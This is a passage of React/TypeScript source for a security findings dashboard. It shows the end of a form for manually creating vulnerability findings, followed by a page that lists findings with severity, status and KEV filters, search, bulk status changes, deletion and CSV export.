          <div className="grid grid-cols-2 gap-4">
            <div className="space-y-1.5">
              <label className="text-xs font-medium text-zinc-400 uppercase tracking-wider">Category</label>
              <input
                value={form.category}
                onChange={set("category")}
                placeholder="e.g. injection, auth"
                className="w-full rounded-lg border border-zinc-700 bg-zinc-900 px-3 py-2 text-sm text-zinc-200 placeholder:text-zinc-600 focus:outline-none focus:border-zinc-500"
              />
            </div>
            <div className="space-y-1.5">
              <label className="text-xs font-medium text-zinc-400 uppercase tracking-wider">Affected Asset</label>
              <input
                value={form.affected_asset}
                onChange={set("affected_asset")}
                placeholder="e.g. https://api.example.com"
                className="w-full rounded-lg border border-zinc-700 bg-zinc-900 px-3 py-2 text-sm text-zinc-200 placeholder:text-zinc-600 focus:outline-none focus:border-zinc-500"
              />
            </div>
          </div>

          {/* Description */}
          <div className="space-y-1.5">
            <label className="text-xs font-medium text-zinc-400 uppercase tracking-wider">Description</label>
            <textarea
              value={form.description}
              onChange={set("description")}
              rows={3}
              placeholder="Describe the vulnerability, its impact, and how it was found..."
              className="w-full rounded-lg border border-zinc-700 bg-zinc-900 px-3 py-2 text-sm text-zinc-200 placeholder:text-zinc-600 focus:outline-none focus:border-zinc-500 resize-none"
            />
          </div>

          {/* Evidence — always filled by tester, never pre-populated by templates */}
          <div className="space-y-1.5">
            <div className="flex items-center justify-between">
              <label className="text-xs font-medium text-zinc-400 uppercase tracking-wider">Evidence</label>
              <span className="text-xs text-orange-400 font-medium">Tester input required</span>
            </div>
            <textarea
              value={form.evidence_text}
              onChange={set("evidence_text")}
              rows={4}
              placeholder="Paste request/response, screenshots, payload output, or PoC steps here..."
              className="w-full rounded-lg border border-orange-500/30 bg-zinc-900 px-3 py-2 text-sm text-zinc-200 placeholder:text-zinc-600 focus:outline-none focus:border-orange-500/60 font-mono resize-none"
            />
          </div>

          {/* Remediation */}
          <div className="space-y-1.5">
            <label className="text-xs font-medium text-zinc-400 uppercase tracking-wider">Remediation</label>
            <textarea
              value={form.remediation}
              onChange={set("remediation")}
              rows={3}
              placeholder="Steps to fix this vulnerability (one per line)..."
              className="w-full rounded-lg border border-zinc-700 bg-zinc-900 px-3 py-2 text-sm text-zinc-200 placeholder:text-zinc-600 focus:outline-none focus:border-zinc-500 resize-none"
            />
          </div>

          {/* CVE + CVSS */}
          <div className="grid grid-cols-2 gap-4">
            <div className="space-y-1.5">
              <label className="text-xs font-medium text-zinc-400 uppercase tracking-wider">CVE IDs</label>
              <textarea
                value={form.cve_text}
                onChange={set("cve_text")}
                rows={2}
                placeholder="CVE-2024-1234&#10;CVE-2024-5678"
                className="w-full rounded-lg border border-zinc-700 bg-zinc-900 px-3 py-2 text-sm text-zinc-200 placeholder:text-zinc-600 focus:outline-none focus:border-zinc-500 font-mono resize-none"
              />
            </div>
            <div className="space-y-1.5">
              <label className="text-xs font-medium text-zinc-400 uppercase tracking-wider">CVSS Score (0–10)</label>
              <input
                value={form.cvss_score}
                onChange={set("cvss_score")}
                type="number"
                min={0}
                max={10}
                step={0.1}
                placeholder="e.g. 8.1"
                className="w-full rounded-lg border border-zinc-700 bg-zinc-900 px-3 py-2 text-sm text-zinc-200 placeholder:text-zinc-600 focus:outline-none focus:border-zinc-500"
              />
            </div>
          </div>

          {/* References */}
          <div className="space-y-1.5">
            <label className="text-xs font-medium text-zinc-400 uppercase tracking-wider">References (one URL per line)</label>
            <textarea
              value={form.references_text}
              onChange={set("references_text")}
              rows={2}
              placeholder="https://owasp.org/...&#10;https://cve.mitre.org/..."
              className="w-full rounded-lg border border-zinc-700 bg-zinc-900 px-3 py-2 text-sm text-zinc-200 placeholder:text-zinc-600 focus:outline-none focus:border-zinc-500 resize-none"
            />
          </div>

          {/* Ticket Ref */}
          <div className="space-y-1.5">
            <label className="text-xs font-medium text-zinc-400 uppercase tracking-wider">Ticket Reference</label>
            <input
              value={form.ticket_ref}
              onChange={set("ticket_ref")}
              placeholder="e.g. JIRA-1234 or GitHub #42"
              className="w-full rounded-lg border border-zinc-700 bg-zinc-900 px-3 py-2 text-sm text-zinc-200 placeholder:text-zinc-600 focus:outline-none focus:border-zinc-500"
            />
          </div>
        </form>

        {/* Footer */}
        <div className="shrink-0 flex items-center justify-end gap-3 px-6 py-4 border-t border-zinc-800 bg-zinc-950">
          <Button variant="ghost" onClick={onClose} className="text-zinc-400">
            Cancel
          </Button>
          <Button
            onClick={(e) => {
              e.preventDefault();
              const formEl = document.querySelector("form");
              formEl?.requestSubmit();
            }}
            disabled={createFinding.isPending}
            className="bg-orange-600 hover:bg-orange-500 text-white"
          >
            {createFinding.isPending ? "Creating…" : "Create Finding"}
          </Button>
        </div>
      </div>
    </>
  );
}

export default function FindingsPage() {
  const [viewMode, setViewMode] = useState<'active' | 'suppressed'>('active');
  const [filters, setFilters] = useState<FindingFilters>({ statuses: ["open", "in_progress"] });
  const [kevOnly, setKevOnly] = useState(false);
  const [confidenceFilter, setConfidenceFilter] = useState("");
  const [secretsOnly, setSecretsOnly] = useState(false);
  const [overdueOnly, setOverdueOnly] = useState(false);
  const [page, setPage] = useState(1);
  const [drawerOpen, setDrawerOpen] = useState(false);
  const [searchQuery, setSearchQuery] = useState("");
  const [selectedIds, setSelectedIds] = useState<Set<string>>(new Set());
  const [bulkLoading, setBulkLoading] = useState(false);
  const [showBulkDeleteConfirm, setShowBulkDeleteConfirm] = useState(false);
  const queryClient = useQueryClient();

  // Build query params based on view mode + filters
  const activeQueryFilters: FindingFilters & { page?: number; per_page?: number; category?: string; overdue?: boolean } = viewMode === 'active'
    ? {
        ...filters,
        suppressed: false,
        kev_only: kevOnly || undefined,
        confidence: confidenceFilter || undefined,
        category: secretsOnly ? "exposed_secret" : undefined,
        overdue: overdueOnly || undefined,
        page,
        per_page: PER_PAGE,
      }
    : {
        suppressed: true,
        page,
        per_page: PER_PAGE,
      };

  const { data, isLoading } = useFindings(activeQueryFilters);
  const findings = data?.items ?? [];
  const total = data?.total ?? 0;
  const totalPages = Math.ceil(total / PER_PAGE);

  // Fetch suppressed count for the badge
  const { data: suppressedData } = useFindings({ suppressed: true, per_page: 1, page: 1 });
  const suppressedCount = suppressedData?.total ?? 0;

  const toggleSeverity = (severity: FindingSeverity) => {
    const current = filters.severities ?? [];
    const updated = current.includes(severity)
      ? current.filter((s) => s !== severity)
      : [...current, severity];
    setFilters((f) => ({ ...f, severities: updated.length > 0 ? updated : undefined }));
    setPage(1);
  };

  const toggleStatus = (status: FindingStatus) => {
    const current = filters.statuses ?? [];
    const updated = current.includes(status)
      ? current.filter((s) => s !== status)
      : [...current, status];
    setFilters((f) => ({ ...f, statuses: updated.length > 0 ? updated : undefined }));
    setPage(1);
  };

  const clearFilters = () => {
    setFilters({});
    setKevOnly(false);
    setConfidenceFilter("");
    setSecretsOnly(false);
    setOverdueOnly(false);
    setPage(1);
  };

  // Search filter applied client-side on the current page's findings
  const filteredFindings = searchQuery.trim()
    ? findings.filter((f) =>
        f.title?.toLowerCase().includes(searchQuery.toLowerCase())
      )
    : findings;

  // Select all visible (filtered) findings on current page
  const allVisibleSelected =
    filteredFindings.length > 0 &&
    filteredFindings.every((f) => selectedIds.has(f.id));

  const toggleSelectAll = () => {
    if (allVisibleSelected) {
      setSelectedIds((prev) => {
        const next = new Set(prev);
        filteredFindings.forEach((f) => next.delete(f.id));
        return next;
      });
    } else {
      setSelectedIds((prev) => {
        const next = new Set(prev);
        filteredFindings.forEach((f) => next.add(f.id));
        return next;
      });
    }
  };

  const toggleSelectOne = (id: string) => {
    setSelectedIds((prev) => {
      const next = new Set(prev);
      if (next.has(id)) {
        next.delete(id);
      } else {
        next.add(id);
      }
      return next;
    });
  };

  const handleBulkStatus = async (status: string) => {
    if (selectedIds.size === 0) return;
    setBulkLoading(true);
    try {
      const resp = await fetchWithAuth(`${API_BASE}/findings/bulk-status`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ finding_ids: Array.from(selectedIds), status }),
      });
      if (!resp.ok) throw new Error("Bulk status update failed");
      toast.success(`Marked ${selectedIds.size} finding(s) as ${status.replace("_", " ")}`);
      setSelectedIds(new Set());
      queryClient.invalidateQueries({ queryKey: findingKeys.lists() });
    } catch {
      toast.error("Failed to update findings");
    } finally {
      setBulkLoading(false);
    }
  };

  const handleBulkDelete = async () => {
    if (selectedIds.size === 0) return;
    setBulkLoading(true);
    try {
      const resp = await fetchWithAuth(`${API_BASE}/findings/bulk-delete`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ finding_ids: Array.from(selectedIds) }),
      });
      if (!resp.ok) throw new Error("Bulk delete failed");
      toast.success(`Deleted ${selectedIds.size} finding(s)`);
      setSelectedIds(new Set());
      setShowBulkDeleteConfirm(false);
      queryClient.invalidateQueries({ queryKey: findingKeys.lists() });
    } catch {
      toast.error("Failed to delete findings");
    } finally {
      setBulkLoading(false);
    }
  };

  const handleExportSelected = async () => {
    if (selectedIds.size === 0) return;
    try {
      const ids = Array.from(selectedIds).join(",");
      const url = `${API_BASE}/findings/export?fmt=csv&finding_ids=${encodeURIComponent(ids)}`;
      const resp = await fetchWithAuth(url);
      if (!resp.ok) { toast.error("Export failed"); return; }
      const blob = await resp.blob();
      const a = document.createElement("a");
      a.href = URL.createObjectURL(blob);
      a.download = "findings-selected.csv";
      a.click();
    } catch {
      toast.error("Export failed");
    }
  };

  const handleExportAll = async () => {
    try {
      const resp = await fetchWithAuth(`${API_BASE}/findings/export?fmt=csv`);
      if (!resp.ok) { toast.error("Export failed"); return; }
      const blob = await resp.blob();
      const a = document.createElement("a");
      a.href = URL.createObjectURL(blob);
      a.download = "findings-all.csv";
      a.click();
    } catch {
      toast.error("Export failed");
    }
  };

  const hasFilters =
    (filters.severities?.length ?? 0) > 0 ||
    (filters.statuses?.length ?? 0) > 0 ||
    !!filters.has_cve ||
    kevOnly ||
    !!confidenceFilter ||
    secretsOnly ||
    overdueOnly;

  const SEVERITY_COLORS: Record<FindingSeverity, string> = {
    critical: "text-red-500",
    high: "text-orange-500",
    medium: "text-yellow-500",
    low: "text-blue-400",
    info: "text-gray-400",
  };

  const handleViewModeChange = (mode: 'active' | 'suppressed') => {
    setViewMode(mode);
    setPage(1);
  };

  return (
    <div className="flex gap-6 h-full">
      {/* Filter sidebar — only show in active mode */}
      {viewMode === 'active' && (
        <div className="w-52 shrink-0 space-y-5 rounded-lg border border-zinc-800 bg-zinc-900 p-4 self-start">
          <div className="flex items-center justify-between">
            <h3 className="text-sm font-semibold text-zinc-300">Filters</h3>
            {hasFilters && (
              <Button
                variant="ghost"
                size="sm"
                onClick={clearFilters}
                className="h-6 text-xs text-zinc-500 gap-1 px-2"
              >
                <X className="h-3 w-3" />
                Clear
              </Button>
            )}
          </div>

          {/* KEV Only toggle */}
          <div className="space-y-2">
            <Label className="text-xs uppercase tracking-wider text-zinc-500">Threat Intel</Label>
            <button
              onClick={() => { setKevOnly(!kevOnly); setPage(1); }}
              className={`flex items-center gap-1.5 rounded-full border px-3 py-1 text-xs font-medium transition-colors w-full justify-start ${
                kevOnly
                  ? 'bg-red-900/50 border-red-500/50 text-red-300'
                  : 'border-zinc-600 text-zinc-400 hover:border-red-500/50 hover:text-red-300'
              }`}
            >
              <span className={`h-2 w-2 rounded-full ${kevOnly ? 'bg-red-400 animate-pulse' : 'bg-zinc-600'}`} />
              KEV Only
            </button>

            {/* Secrets quick-filter */}
            <button
              onClick={() => { setSecretsOnly(!secretsOnly); setPage(1); }}
              className={`flex items-center gap-1.5 rounded-full border px-3 py-1 text-xs font-medium transition-colors w-full justify-start ${
                secretsOnly
                  ? 'bg-amber-900/50 border-amber-500/50 text-amber-300'
                  : 'border-zinc-600 text-zinc-400 hover:border-amber-500/50 hover:text-amber-300'
              }`}
            >
              <Lock className="h-3 w-3" />
              Secrets Only
            </button>

            {/* Overdue quick-filter */}
            <button
              onClick={() => { setOverdueOnly(!overdueOnly); setPage(1); }}
              className={`flex items-center gap-1.5 rounded-full border px-3 py-1 text-xs font-medium transition-colors w-full justify-start ${
                overdueOnly
                  ? 'bg-orange-900/50 border-orange-500/50 text-orange-300'
                  : 'border-zinc-600 text-zinc-400 hover:border-orange-500/50 hover:text-orange-300'
              }`}
            >
              <Clock className="h-3 w-3" />
              Overdue
            </button>
          </div>

          <Separator />

          {/* Confidence filter */}
          <div className="space-y-2">
            <Label className="text-xs uppercase tracking-wider text-zinc-500">Confidence</Label>
            <select
              value={confidenceFilter}
              onChange={(e) => { setConfidenceFilter(e.target.value); setPage(1); }}
              className="w-full rounded-lg border border-zinc-600 bg-zinc-800 px-3 py-1.5 text-sm text-zinc-300"
            >
              <option value="">All Confidence</option>
              <option value="certain">Certain</option>
              <option value="high">High</option>
              <option value="medium">Medium</option>
              <option value="low">Low</option>
            </select>
          </div>

          <Separator />

          <div className="space-y-2">
            <Label className="text-xs uppercase tracking-wider text-zinc-500">Severity</Label>
            {SEVERITIES.map((severity) => (
              <div key={severity} className="flex items-center gap-2">
                <Checkbox
                  id={`sev-${severity}`}
                  checked={(filters.severities ?? []).includes(severity)}
                  onCheckedChange={() => toggleSeverity(severity)}
                />
                <label
                  htmlFor={`sev-${severity}`}
                  className={`text-sm cursor-pointer capitalize font-medium ${SEVERITY_COLORS[severity]}`}
                >
                  {severity}
                </label>
              </div>
            ))}
          </div>

          <Separator />

          <div className="space-y-2">
            <Label className="text-xs uppercase tracking-wider text-zinc-500">Status</Label>
            {STATUSES.map((status) => (
              <div key={status} className="flex items-center gap-2">
                <Checkbox
                  id={`status-${status}`}
                  checked={(filters.statuses ?? []).includes(status)}
                  onCheckedChange={() => toggleStatus(status)}
                />
                <label
                  htmlFor={`status-${status}`}
                  className="text-sm cursor-pointer text-zinc-300 capitalize"
                >
                  {status.replace("_", " ")}
                </label>
              </div>
            ))}
          </div>

          <Separator />

          <div className="space-y-2">
            <Label className="text-xs uppercase tracking-wider text-zinc-500">CVE / CVSS</Label>
            <div className="flex items-center gap-2">
              <Checkbox
                id="has-cve"
                checked={!!filters.has_cve}
                onCheckedChange={(checked) => {
                  setFilters((f) => ({ ...f, has_cve: checked ? true : undefined }));
                  setPage(1);
                }}
              />
              <label htmlFor="has-cve" className="text-sm cursor-pointer text-zinc-300">
                Has CVE ID
              </label>
            </div>
          </div>
        </div>
      )}

      {/* Main content */}
      <div className="flex-1 min-w-0 space-y-4">
        <div className="flex items-center justify-between gap-4">
          <div>
            <h1 className="text-2xl font-bold text-zinc-100">Findings</h1>
            <p className="text-sm text-zinc-400 mt-0.5">
              {total.toLocaleString()} findings {hasFilters && viewMode === 'active' && "matching filters"}
            </p>
          </div>
          <div className="flex items-center gap-2">
            {/* Search bar */}
            <div className="relative">
              <Search className="absolute left-2.5 top-1/2 -translate-y-1/2 h-3.5 w-3.5 text-zinc-500 pointer-events-none" />
              <input
                type="text"
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                placeholder="Search findings..."
                className="pl-8 pr-3 py-1.5 rounded-md border border-zinc-700 bg-zinc-900 text-sm text-zinc-200 placeholder:text-zinc-600 focus:outline-none focus:border-zinc-500 w-52"
              />
              {searchQuery && (
                <button
                  onClick={() => setSearchQuery("")}
                  className="absolute right-2.5 top-1/2 -translate-y-1/2 text-zinc-500 hover:text-zinc-300"
                >
                  <X className="h-3.5 w-3.5" />
                </button>
              )}
            </div>
            {/* Export All CSV */}
            <Button
              variant="outline"
              size="sm"
              onClick={handleExportAll}
              className="gap-1.5 border-zinc-700 text-zinc-300 hover:text-zinc-100"
            >
              <Download className="h-3.5 w-3.5" />
              Export CSV
            </Button>
            <Button
              onClick={() => setDrawerOpen(true)}
              className="bg-orange-600 hover:bg-orange-500 text-white gap-1.5"
              size="sm"
            >
              <Plus className="h-4 w-4" />
              Create Finding
            </Button>
          </div>
        </div>

        {/* Active / Suppressed tab bar */}
        <div className="flex gap-1 rounded-lg bg-gray-800/50 p-1 w-fit">
          <button
            onClick={() => handleViewModeChange('active')}
            className={`px-4 py-1.5 rounded-md text-sm font-medium transition-colors ${
              viewMode === 'active'
                ? 'bg-gray-700 text-white'
                : 'text-gray-400 hover:text-white'
            }`}
          >
            Active Findings
          </button>
          <button
            onClick={() => handleViewModeChange('suppressed')}
            className={`px-4 py-1.5 rounded-md text-sm font-medium transition-colors ${
              viewMode === 'suppressed'
                ? 'bg-gray-700 text-white'
                : 'text-gray-400 hover:text-white'
            }`}
          >
            Suppressed
            {suppressedCount > 0 && (
              <span className="ml-1.5 rounded-full bg-gray-600 px-1.5 py-0.5 text-xs">
                {suppressedCount}
              </span>
            )}
          </button>
        </div>

        {isLoading ? (
          <div className="rounded-lg border border-zinc-800 divide-y divide-zinc-800">
            {Array.from({ length: 8 }).map((_, i) => (
              <div key={i} className="flex items-center gap-3 px-4 py-3">
                <div className="h-3.5 w-3.5 rounded bg-zinc-800 animate-pulse shrink-0" />
                <div className="h-6 w-20 rounded bg-zinc-800 animate-pulse shrink-0" />
                <div className="flex-1 space-y-1.5">
                  <div className="h-4 w-64 rounded bg-zinc-800 animate-pulse" />
                  <div className="h-3 w-40 rounded bg-zinc-800 animate-pulse" />
                </div>
                <div className="h-6 w-24 rounded bg-zinc-800 animate-pulse shrink-0" />
              </div>
            ))}
          </div>
        ) : filteredFindings.length === 0 ? (
          <EmptyState
            icon={<ShieldAlert className="h-8 w-8" />}
            title={
              searchQuery
                ? "No findings match your search"
                : viewMode === 'suppressed' ? "No suppressed findings" : "No findings"
            }
            description={
              searchQuery
                ? `No findings matched "${searchQuery}". Try a different search term.`
                : viewMode === 'suppressed'
                  ? "No findings have been suppressed or marked as false positive."
                  : "No findings match your current filters. Run a scan or create a manual finding."
            }
          />
        ) : (
          <div className="rounded-lg border border-zinc-800 overflow-hidden divide-y divide-zinc-800">
            {/* Select-all header row */}
            <div className="flex items-center gap-3 px-4 py-2 bg-zinc-900/60 border-b border-zinc-800">
              <Checkbox
                checked={allVisibleSelected}
                onCheckedChange={toggleSelectAll}
                aria-label="Select all findings"
              />
              <span className="text-xs text-zinc-500">
                {selectedIds.size > 0
                  ? `${selectedIds.size} selected`
                  : `Select all (${filteredFindings.length})`}
              </span>
            </div>
            {filteredFindings.map((f) => (
              <div key={f.id} className="flex items-start gap-3 px-4 group">
                <div className="flex items-center pt-3.5 shrink-0">
                  <Checkbox
                    checked={selectedIds.has(f.id)}
                    onCheckedChange={() => toggleSelectOne(f.id)}
                    aria-label={`Select finding ${f.title}`}
                  />
                </div>
                <div className="flex-1 min-w-0">
                  <FindingRow finding={f} />
                </div>
              </div>
            ))}
          </div>
        )}

        {/* Pagination — always show count; show nav only when multi-page */}
        {total > 0 && (
          <div className="flex items-center justify-between text-sm text-zinc-500">
            <span>
              Showing{" "}
              <span className="text-zinc-300 font-medium">
                {(page - 1) * PER_PAGE + 1}–{Math.min(page * PER_PAGE, total)}
              </span>{" "}
              of{" "}
              <span className="text-zinc-300 font-medium">{total.toLocaleString()}</span>{" "}
              finding{total !== 1 ? "s" : ""}
            </span>
            {totalPages > 1 && (
              <div className="flex items-center gap-2">
                <Button
                  variant="outline"
                  size="sm"
                  onClick={() => setPage((p) => Math.max(1, p - 1))}
                  disabled={page === 1}
                  className="h-8"
                >
                  <ChevronLeft className="h-4 w-4" />
                </Button>
                <span className="text-zinc-400">
                  Page {page} of {totalPages}
                </span>
                <Button
                  variant="outline"
                  size="sm"
                  onClick={() => setPage((p) => Math.min(totalPages, p + 1))}
                  disabled={page === totalPages}
                  className="h-8"
                >
                  <ChevronRight className="h-4 w-4" />
                </Button>
              </div>
            )}
          </div>
        )}
      </div>

      {/* Floating bulk action bar */}
      {selectedIds.size > 0 && (
        <div className="fixed bottom-6 left-1/2 -translate-x-1/2 z-50 flex items-center gap-3 bg-zinc-800 border border-zinc-600 rounded-xl px-5 py-3 shadow-2xl">
          <span className="text-sm font-medium text-zinc-200 flex items-center gap-1.5">
            <CheckSquare className="h-4 w-4 text-blue-400" />
            {selectedIds.size} selected
          </span>
          <div className="w-px h-5 bg-zinc-600" />
          <button
            onClick={() => handleBulkStatus("remediated")}
            disabled={bulkLoading}
            className="px-3 py-1.5 rounded-md text-xs font-medium bg-green-700 hover:bg-green-600 text-white disabled:opacity-50 transition-colors"
          >
            Mark as Remediated
          </button>
          <button
            onClick={() => handleBulkStatus("accepted_risk")}
            disabled={bulkLoading}
            className="px-3 py-1.5 rounded-md text-xs font-medium bg-yellow-700 hover:bg-yellow-600 text-white disabled:opacity-50 transition-colors"
          >
            Mark as Accepted Risk
          </button>
          <button
            onClick={handleExportSelected}
            disabled={bulkLoading}
            className="px-3 py-1.5 rounded-md text-xs font-medium bg-zinc-700 hover:bg-zinc-600 text-zinc-200 disabled:opacity-50 transition-colors flex items-center gap-1"
          >
            <Download className="h-3.5 w-3.5" />
            Export Selected (CSV)
          </button>
          <div className="w-px h-5 bg-zinc-600" />
          <button
            onClick={() => setShowBulkDeleteConfirm(true)}
            disabled={bulkLoading}
            className="px-3 py-1.5 rounded-md text-xs font-medium bg-red-900/60 hover:bg-red-800 text-red-200 disabled:opacity-50 transition-colors flex items-center gap-1"
          >
            <Trash2 className="h-3.5 w-3.5" />
            Delete
          </button>
          <div className="w-px h-5 bg-zinc-600" />
          <button
            onClick={() => setSelectedIds(new Set())}
            className="text-zinc-400 hover:text-zinc-200 transition-colors"
            aria-label="Clear selection"
          >
            <X className="h-4 w-4" />
          </button>
        </div>
      )}

      <Dialog open={showBulkDeleteConfirm} onOpenChange={setShowBulkDeleteConfirm}>
        <DialogContent>
          <DialogHeader>
            <DialogTitle>Delete {selectedIds.size} finding(s)?</DialogTitle>
            <DialogDescription>
              This permanently deletes the selected finding(s) and cannot be undone. Comments and history
              attached to them will be deleted too.
            </DialogDescription>
          </DialogHeader>
          <DialogFooter>
            <Button variant="outline" onClick={() => setShowBulkDeleteConfirm(false)} disabled={bulkLoading}>
              Cancel
            </Button>
            <Button variant="destructive" onClick={handleBulkDelete} disabled={bulkLoading}>
              {bulkLoading ? "Deleting..." : "Delete"}
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      <CreateFindingDrawer open={drawerOpen} onClose={() => setDrawerOpen(false)} />
    </div>
  );
}
